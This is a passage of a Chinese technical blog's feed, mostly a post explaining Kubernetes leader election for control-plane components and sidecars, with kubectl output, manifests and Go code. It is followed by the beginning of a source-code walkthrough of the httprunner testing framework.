hook 是一个很常见的需求，目前只发现了 Finalizers 适合实现这个功能，需要好好掌握。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://kubernetes.io/docs/tasks/access-kubernetes-api/custom-resources/custom-resource-definitions/#finalizers" target="_blank" rel="noopener">https://kubernetes.io/docs/tasks/access-kubernetes-api/custom-resources/custom-resource-definitions/#finalizers</a> </li><li><a href="https://book.kubebuilder.io/reference/using-finalizers.html" target="_blank" rel="noopener">https://book.kubebuilder.io/reference/using-finalizers.html</a></li><li><a href="https://stackoverflow.com/questions/53057185/kubernetes-crd-finalizer" target="_blank" rel="noopener">https://stackoverflow.com/questions/53057185/kubernetes-crd-finalizer</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;最近在写 k8s Operator，在看示例的时候看到 controller 都会设置 Finalizers，今天来聊一聊 Finalize
      
    
    </summary>
    
    
      <category term="Kubernetes" scheme="https://zdyxry.github.io/tags/Kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes 实战-Leader 选举</title>
    <link href="https://zdyxry.github.io/2019/09/12/Kubernetes-%E5%AE%9E%E6%88%98-Leader-%E9%80%89%E4%B8%BE/"/>
    <id>https://zdyxry.github.io/2019/09/12/Kubernetes-实战-Leader-选举/</id>
    <published>2019-09-12T14:05:22.000Z</published>
    <updated>2019-09-12T14:06:52.621Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近手头上的 Cluster-API 的项目要告一段落， Cluster-API 发布了 <a href="https://github.com/kubernetes-sigs/cluster-api/releases/tag/v0.2.1" target="_blank" rel="noopener">v0.2.1 版本</a> ，正式放出了 YAML 配置文件，看到了点有意思的事情，觉得需要记录一下。</p><h2 id="K8S-Leader"><a href="#K8S-Leader" class="headerlink" title="K8S Leader"></a>K8S Leader</h2><p>看过之前 K8S 实战系列的朋友应该记得我写过一篇 <a href="https://zdyxry.github.io/2019/06/15/Kubernetes-%E5%AE%9E%E6%88%98-%E9%AB%98%E5%8F%AF%E7%94%A8%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/">K8S 高可用部署</a>的文章，在文章中只是讲了具体的操作步骤，没有提到 k8s 是如何保证自己多个组件之间协作的。</p><p>我们这里有一个 3 个master 节点的集群：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@node70 21:01:01 ~]$kubectl get node</span><br><span class="line">NAME     STATUS   ROLES    AGE   VERSION</span><br><span class="line">node70   Ready    master   64d   v1.15.0</span><br><span class="line">node71   Ready    master   64d   v1.15.0</span><br><span class="line">node72   Ready    master   64d   v1.15.0</span><br></pre></td></tr></table></figure><p>我们都知道 k8s 核心组件，其中 apiserver 只用于接收 api 请求，不会主动进行各种动作，所以他们在每个节点都运行并且都可以接收请求，不会造成异常；kube-proxy 也是一样，只用于做端口转发，不会主动进行动作执行。</p><p>但是 scheduler, controller-manager 不同，他们参与了 Pod 的调度及具体的各种资源的管控，如果同时有多个 controller-manager 来对 Pod 资源进行调度，结果太美不敢看，那么 k8s 是如何做到正确运转的呢？</p><p>k8s 所有功能都是通过 <code>services</code> 对外暴露接口，而 <code>services</code> 对应的是具体的 <code>endpoints</code> ，那么来看下 scheduler 和 controller-manager 的 <code>endpoints</code> 是什么：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@node70 21:04:46 ~]$kubectl -n kube-system describe endpoints kube-scheduler</span><br><span class="line">Name:         kube-scheduler</span><br><span class="line">Namespace:    kube-system</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  control-plane.alpha.kubernetes.io/leader:</span><br><span class="line">                &#123;"holderIdentity":"node70_ed12bf09-7aa3-47d6-9546-97752bb589b5","leaseDurationSeconds":15,"acquireTime":"2019-09-11T05:31:58Z","renewTime"...</span><br><span class="line">Subsets:</span><br><span class="line">Events:  &lt;none&gt;</span><br><span class="line">[root@node70 21:05:25 ~]$kubectl -n kube-system describe endpoints kube-controller-manager</span><br><span class="line">Name:         kube-controller-manager</span><br><span class="line">Namespace:    kube-system</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  control-plane.alpha.kubernetes.io/leader:</span><br><span class="line">                &#123;"holderIdentity":"node71_c8deeaea-2d66-4459-90ee-65c28563062f","leaseDurationSeconds":15,"acquireTime":"2019-09-12T12:44:15Z","renewTime"...</span><br><span class="line">Subsets:</span><br><span class="line">Events:</span><br><span class="line">  Type    Reason          Age   From                     Message</span><br><span class="line">  ----    ------          ----  ----                     -------</span><br><span class="line">  Normal  LeaderElection  22m   kube-controller-manager  node71_c8deeaea-2d66-4459-90ee-65c28563062f became leader</span><br></pre></td></tr></table></figure><p>  可以看到关键字 <code>control-plane.alpha.kubernetes.io/leader</code> ，这两个组件是通过 leader 选举来从集群中多个节点选择一个执行具体动作，如果我们去看 <code>/etc/kubernetes/manifests/</code> 下的配置文件，会看到这行配置：</p>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  creationTimestamp:</span> <span class="literal">null</span></span><br><span class="line"><span class="attr">  labels:</span></span><br><span class="line"><span class="attr">    component:</span> <span class="string">kube-controller-manager</span></span><br><span class="line"><span class="attr">    tier:</span> <span class="string">control-plane</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">kube-controller-manager</span></span><br><span class="line"><span class="attr">  namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  containers:</span></span><br><span class="line"><span class="attr">  - command:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">kube-controller-manager</span></span><br><span class="line"><span class="bullet">    -</span> <span class="bullet">--allocate-node-cidrs=true</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="bullet">    -</span> <span class="bullet">--leader-elect=true</span></span><br></pre></td></tr></table></figure><p>通过在 YAML 中添加 <code>leader-elect=true</code> 来决定是否进行选主逻辑。而这个参数也是在执行 <code>kubeadm</code> 部署集群时就自动配置好了，无需手动配置。</p><h2 id="Deployment-Leader"><a href="#Deployment-Leader" class="headerlink" title="Deployment Leader"></a>Deployment Leader</h2><p>我们先来说说 Deployment，Deployment 是从 ReplicaSet 进化来的，主要增加的功能有滚动更新、回滚、扩容所容等，可以说是我们日常使用 K8S 最常见的资源类型了。</p><p>那么当我们通过创建 Deployment 间接创建 ReplicaSet 时，我们有时候并不想所有的 ReplicaSet 中的 Pod 运行统一的逻辑。这时候我们就需要一种方式来选择（通知）某一个 Pod ，来确定这个 Pod 提供特殊功能，其他的 Pod 提供普通功能，也就是跟上述 k8s 实现方式一样，通过Leader 选举完成需求。</p><p>Leader 选举有很多方式，或是代码中内嵌选举逻辑，或者通过第三方服务，但是有两个的特点：</p><ol><li>Leader 在同一时间内是唯一的</li><li>当 Leader 所在 Pod 发生异常时，其他 Pod 要可以随时变为 Leader 。</li></ol><h2 id="Leader-选举实现方式"><a href="#Leader-选举实现方式" class="headerlink" title="Leader 选举实现方式"></a>Leader 选举实现方式</h2><h3 id="代码内嵌选主逻辑"><a href="#代码内嵌选主逻辑" class="headerlink" title="代码内嵌选主逻辑"></a>代码内嵌选主逻辑</h3><p>在 Golang 中，k8s client-go 这个package 针对 Leader 相关功能进行了封装，支持3种锁资源，endpoint，configmap，lease，方便使用。</p><p>代码仓库：<a href="https://github.com/kubernetes/client-go/tree/master/tools/leaderelection" target="_blank" rel="noopener">https://github.com/kubernetes/client-go/tree/master/tools/leaderelection</a></p><p>因为这次主要不是说具体实现，再加上我也没看过代码，这里先掠过。</p><h3 id="SideCar"><a href="#SideCar" class="headerlink" title="SideCar"></a>SideCar</h3><p>相比于代码中内嵌选主逻辑，使用 sidecar 就不用担心跨语言的问题了，使用起来也简单许多，我们现在用的这个项目实现：<a href="https://github.com/kubernetes-retired/contrib/blob/master/election/README.md" target="_blank" rel="noopener">https://github.com/kubernetes-retired/contrib/blob/master/election/README.md</a></p><p>使用方式：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">extensions/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">DaemonSet</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  creationTimestamp:</span> <span class="string">"2019-07-12T07:35:32Z"</span></span><br><span class="line"><span class="attr">  generation:</span> <span class="number">6</span></span><br><span class="line"><span class="attr">  labels:</span></span><br><span class="line"><span class="attr">    app:</span> <span class="string">yiran-test</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">yiran-test</span></span><br><span class="line"><span class="attr">  namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  selector:</span></span><br><span class="line"><span class="attr">    matchLabels:</span></span><br><span class="line"><span class="attr">      app:</span> <span class="string">yiran-test</span></span><br><span class="line"><span class="attr">  template:</span></span><br><span class="line"><span class="attr">    metadata:</span></span><br><span class="line"><span class="attr">      annotations:</span></span><br><span class="line">        <span class="string">kubectl.kubernetes.io/restartedAt:</span> <span class="string">"2019-09-09T10:58:51+08:00"</span></span><br><span class="line"><span class="attr">      creationTimestamp:</span> <span class="literal">null</span></span><br><span class="line"><span class="attr">      labels:</span></span><br><span class="line"><span class="attr">        app:</span> <span class="string">yiran-test</span></span><br><span class="line"><span class="attr">    spec:</span></span><br><span class="line"><span class="attr">      containers:</span></span><br><span class="line"><span class="attr">      - args:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="bullet">--election=elect-yiran-test</span></span><br><span class="line"><span class="bullet">        -</span> <span class="bullet">--http=0.0.0.0:4444</span></span><br><span class="line"><span class="attr">        image:</span> <span class="attr">leader-elector:0.5</span></span><br><span class="line"><span class="attr">        imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line"><span class="attr">        name:</span> <span class="string">leader-elector</span></span><br><span class="line"><span class="attr">      - args:</span></span><br><span class="line">        <span class="string">...</span></span><br></pre></td></tr></table></figure><p>在 Deployment 或 DaemonSet 中，添加 sidecar 指定端口，最终会在所有的 Pod 中选择一个 Leader 。<br>在业务代码中，只需要访问端口 4444 ，即可获取当前 Pod 中 Leader 信息，目前是通过 hostname 作为唯一标示的。</p><p>如果看了这个项目的代码，会发现它也是使用的 client go 中的实现，只是增加了一层 http server：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getCurrentLeader</span><span class="params">(electionId, namespace <span class="keyword">string</span>, c client.Interface)</span> <span class="params">(<span class="keyword">string</span>, *api.Endpoints, error)</span></span> &#123;</span><br><span class="line">endpoints, err := c.Endpoints(namespace).Get(electionId)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">""</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">val, found := endpoints.Annotations[leaderelection.LeaderElectionRecordAnnotationKey]</span><br><span class="line"><span class="keyword">if</span> !found &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">""</span>, endpoints, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">electionRecord := leaderelection.LeaderElectionRecord&#123;&#125;</span><br><span class="line"><span class="keyword">if</span> err := json.Unmarshal([]<span class="keyword">byte</span>(val), &amp;electionRecord); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">""</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> electionRecord.HolderIdentity, endpoints, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">flags.Parse(os.Args)</span><br><span class="line">validateFlags()</span><br><span class="line"></span><br><span class="line">kubeClient, err := makeClient()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">glog.Fatalf(<span class="string">"error connecting to the client: %v"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn := <span class="function"><span class="keyword">func</span><span class="params">(str <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">leader.Name = str</span><br><span class="line">fmt.Printf(<span class="string">"%s is the leader\n"</span>, leader.Name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">e, err := election.NewElection(*name, *id, *namespace, *ttl, fn, kubeClient)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">glog.Fatalf(<span class="string">"failed to create election: %v"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> election.RunElection(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(*addr) &gt; <span class="number">0</span> &#123;</span><br><span class="line">http.HandleFunc(<span class="string">"/"</span>, webHandler)</span><br><span class="line">http.ListenAndServe(*addr, <span class="literal">nil</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="是否开启选举参数"><a href="#是否开启选举参数" class="headerlink" title="是否开启选举参数"></a>是否开启选举参数</h2><p>那么我们说了这么多，在实际使用中是否应该开启选举参数呢？<br>这里要说一下我在文章开头提到的有意思的事情，我们来看下cluster-api 的 YAML 文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="string">...</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="string">...</span></span><br><span class="line"><span class="attr">  template:</span></span><br><span class="line"><span class="attr">    metadata:</span></span><br><span class="line">      <span class="string">...</span></span><br><span class="line"><span class="attr">    spec:</span></span><br><span class="line"><span class="attr">      containers:</span></span><br><span class="line"><span class="attr">      - args:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="bullet">--enable-leader-election</span></span><br><span class="line"><span class="attr">        command:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">/manager</span></span><br><span class="line"><span class="attr">        image:</span> <span class="string">us.gcr.io/k8s-artifacts-prod/cluster-api/cluster-api-controller:v0.2.1</span></span><br><span class="line"><span class="attr">        name:</span> <span class="string">manager</span></span><br><span class="line">        <span class="string">...</span></span><br></pre></td></tr></table></figure><p>创建的资源类型是 Deployment，replicas 设置为1，传递了参数 <code>--enable-leader-election</code>，当时我觉得有些奇怪，replicas是1 啊，也就是说一共只有1个 Pod，为啥还要开启 Leader 选举逻辑呢？如果说是为了之后的扩容那可以理解，但是在这份配置文件里，应该完全没必要。把这段配置发给 <a href="https://liqiang.io/" target="_blank" rel="noopener">liqiang同学</a> 看，他也觉得有些怪怪的。</p><p>秉着不懂就问的精神，我去 Slack #cluster-api 中提出了我的疑问，得到了以下回复，我格式化一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@cha： </span><br><span class="line">it&apos;s mostly set for best practice. If you scale up the system will still work. If you don&apos;t enable leader election and scale up you will have race conditions</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@cha：</span><br><span class="line">but you&apos;re right. If you&apos;re running a single manager you don&apos;t need to enable leader election</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@jdetiber:</span><br><span class="line">With a Deployment you do, because on rolling out a change it will spin up the new RS in parallel with the other so there will be 2 pods running at the same time for a short while</span><br></pre></td></tr></table></figure><p>其中 @cha 的回复跟我预想的差不多，主要处于之后的扩容考虑，需要防止竞争情况出现。但是 @jdetiber 提到了一点很关键，当 Deployment 进行滚动升级的时候，哪怕设置了 Replicas 为1，也会存在短时间同时存在 2 个 Pod 的情况，那么肯定会导致我们的代码逻辑错误，很重要（感叹号）。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实今天这篇文章主要是想记录下上面这段话的，自己在平时使用 k8s 过程中，貌似也仅仅是知道这些功能并使用，真正要开发部分功能时，考虑的边界条件太少了。虽然知道 Deployment 滚动升级会有同时存在 2 个 Pod 的情况，却完全没有想到需要配置 Leader 选举参数来保证代码正确运行，涨知识了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://kubernetes.io/docs/concepts/workloads/controllers/deployment/" target="_blank" rel="noopener">https://kubernetes.io/docs/concepts/workloads/controllers/deployment/</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;最近手头上的 Cluster-API 的项目要告一段落， Cluster-API 发布了 &lt;a href=&quot;https://github.c
      
    
    </summary>
    
    
      <category term="Kubernetes" scheme="https://zdyxry.github.io/tags/Kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>httprunner 源码阅读</title>
    <link href="https://zdyxry.github.io/2019/09/06/httprunner-%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    <id>https://zdyxry.github.io/2019/09/06/httprunner-源码阅读/</id>
    <published>2019-09-06T11:50:27.000Z</published>
    <updated>2019-09-07T10:45:58.821Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近工作上每天疲于应付各种事情，周末实在不想继续做工作相关的事情，想起一直想了解的自动化测试框架 <a href="https://github.com/httprunner/httprunner" target="_blank" rel="noopener">httprunner</a>，就阅读下。之前一直有关注作者 <a href="https://debugtalk.com/" target="_blank" rel="noopener">debugtalk</a> 的博客，收获很多。</p><p>随着公司的发展，自己也做过很多的工作，其中就包含测试，但是自己当时大部分都是手工测试，虽然会针对其中的部分进行代码编写，但是不成体系。虽然后来就没有继续负责测试工作了，但是对于测试还是很感兴趣，平时开发过程中，最多也就是使用 unittest 或 pytest 来编写单测，这次通过阅读 httprunner 代码来感受下测试框架。</p><p>P.S. 在使用及了解 httprunner 之前，最好先了解下 unittest。</p><h2 id="httprunner"><a href="#httprunner" class="headerlink" title="httprunner"></a>httprunner</h2><blockquote><p>HttpRunner 是一款面向 HTTP(S) 协议的通用测试框架，只需编写维护一份 YAML/JSON 脚本，即可实现自动化测试、性能测试、线上监控、持续集成等多种测试需求。</p></blockquote><p>一句话总结就是 api 自动化测试，其中用到了以下的开源项目：</p><ol><li>requests</li><li>locust</li><li>unittest</li><li>…</li></ol><p>requests 和 unittest 可以说是 python 开发者用的比较多的两个项目。locust 是一个 api 压力测试，这个我们公司也有用到。</p><p>介绍完了项目，我们来跟着官方文档了解运行流程。</p><h2 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h2><p>文档中的 <a href="https://cn.httprunner.org/quickstart/" target="_blank" rel="noopener">快速上手</a> 章节与章节名称很配，真心是 <strong>快速上手</strong> ，通过一个又一个的示例来了解具体的功能使用，循序渐进，简直完美。不过又一点不好的地方是 demo 示例的代码不再 httprunner 中，而是在 docs 项目中，使用起来不是很方便，如果有 Dockerfile 来支撑，就更好了。</p><p>在 httprunner 项目中，项目的包管理是通过 <strong>poetry</strong> 进行的，比 setuptools 要清晰很多。</p><p>首先来看命令，httprunner 随着项目的演进，支持的命令行有 4个，其中 3 个是重复的，1个是压力测试：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[tool.poetry.scripts]</span></span><br><span class="line"><span class="string">hrun</span> <span class="string">=</span> <span class="string">"httprunner.cli:main_hrun"</span></span><br><span class="line"><span class="string">ate</span> <span class="string">=</span> <span class="string">"httprunner.cli:main_hrun"</span></span><br><span class="line"><span class="string">httprunner</span> <span class="string">=</span> <span class="string">"httprunner.cli:main_hrun"</span></span><br><span class="line"><span class="string">locusts</span> <span class="string">=</span> <span class="string">"httprunner.cli:main_locust"</span></span><br></pre></td></tr></table></figure><p>我们以 <code>hrun</code> 为例，从 argparse 接收到的参数均作为参数传递给 HttpRunner，然后执行实例化 HttpRunner，通过 <code>HttpRunner.run</code> 进行用例的执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">runner = HttpRunner(</span><br><span class="line">    failfast=args.failfast,</span><br><span class="line">    save_tests=args.save_tests,</span><br><span class="line">    report_template=args.report_template,</span><br><span class="line">    report_dir=args.report_dir,</span><br><span class="line">    log_level=args.log_level,</span><br><span class="line">    log_file=args.log_file</span><br><span class="line">)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> args.testcase_paths:</span><br><span class="line">        runner.run(path, dot_env_path=args.dot_env_path)</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    color_print(<span class="string">"!!!!!!!!!! exception stage: &#123;&#125; !!!!!!!!!!"</span>.format(runner.exception_stage), <span class="string">"YELLOW"</span>)</span><br><span class="line">    <span class="keyword">raise</span></span><br></pre></td></tr></table></figure><p>我们来看下 <code>runner.run</code> 做了啥：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self, path_or_tests, dot_env_path=None, mapping=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> validator.is_testcase_path(path_or_tests):</span><br><span class="line">        <span class="keyword">return</span> self.run_path(path_or_tests, dot_env_path, mapping)</span><br><span class="line">    <span class="keyword">elif</span> validator.is_testcases(path_or_tests):</span><br><span class="line">        <span class="keyword">return</span> self.run_tests(path_or_tests)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> exceptions.ParamsError(<span class="string">"Invalid testcase path or testcases: &#123;&#125;"</span>.format(path_or_tests))</span><br></pre></td></tr></table></figure><p>这里只是进行了一层判断，判断传入的参数是一个路径还是具体的用例，因为我们主要是了解整个执行流程，所以我们直接假设传入的是测试用例，来看看 <code>self.run_tests</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_tests</span><span class="params">(self, tests_mapping)</span>:</span></span><br><span class="line">    <span class="string">""" run testcase/testsuite data</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    project_mapping = tests_mapping.get(<span class="string">"project_mapping"</span>, &#123;&#125;)</span><br><span class="line">    <span class="keyword">if</span> self.save_tests:</span><br><span class="line">        utils.dump_logs(tests_mapping, project_mapping, <span class="string">"loaded"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># parse tests</span></span><br><span class="line">    self.exception_stage = <span class="string">"parse tests"</span></span><br><span class="line">    parsed_testcases = parser.parse_tests(tests_mapping)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.save_tests:</span><br><span class="line">        utils.dump_logs(parsed_testcases, project_mapping, <span class="string">"parsed"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add tests to test suite</span></span><br><span class="line">    self.exception_stage = <span class="string">"add tests to test suite"</span></span><br><span class="line">    test_suite = self._add_tests(parsed_testcases)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># run test suite</span></span><br><span class="line">    self.exception_stage = <span class="string">"run test suite"</span></span><br><span class="line">    results = self._run_suite(test_suite)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># aggregate results</span></span><br><span class="line">    self.exception_stage = <span class="string">"aggregate results"</span></span><br><span class="line">    self._summary = self._aggregate(results)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate html report</span></span><br><span class="line">    self.exception_stage = <span class="string">"generate html report"</span></span><br><span class="line">    report.stringify_summary(self._summary)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.save_tests:</span><br><span class="line">        utils.dump_logs(self._summary, project_mapping, <span class="string">"summary"</span>)</span><br><span class="line"></span><br><span class="line">    report_path = report.render_html_report(</span><br><span class="line">        self._summary,</span><br><span class="line">        self.report_template,</span><br><span class="line">        self.report_dir</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> 